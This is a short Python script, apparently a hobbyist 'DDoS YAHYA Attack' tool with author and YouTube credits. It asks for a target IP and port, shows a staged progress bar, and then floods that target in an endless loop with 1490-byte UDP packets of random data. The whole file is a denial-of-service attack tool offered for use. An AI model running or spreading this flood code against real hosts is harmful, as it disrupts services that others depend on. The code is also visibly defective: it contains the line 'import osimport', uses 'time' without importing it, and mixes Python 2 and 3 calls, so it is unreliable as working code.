   
import sys
import osimport
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS YAHYA  Attack")
print
print ("Author   : S M YAHYA")
print ("YouTube : Technology yahya")
print ("github   : https://github.com/yahya5654")
print ("Blog : https://syahyasadat.blogspot.com")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ]10%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
